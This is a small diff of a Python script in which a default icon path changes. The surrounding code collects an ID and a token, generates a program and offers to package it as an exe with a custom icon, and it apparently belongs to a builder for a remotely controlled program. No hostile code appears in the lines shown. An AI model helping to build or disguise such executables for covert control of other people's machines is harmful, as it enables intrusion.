@@ -101,7 +101,7 @@ try:
         icon = input("write your icon file address(.ico file): ")
         if icon.endswith(".ico"): pass
     else: 
-        icon = "Files/icon.ico"
+        icon = "icongallery/icon.ico"
     make_python(ID=id, TOKEN=token, NAME=name)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
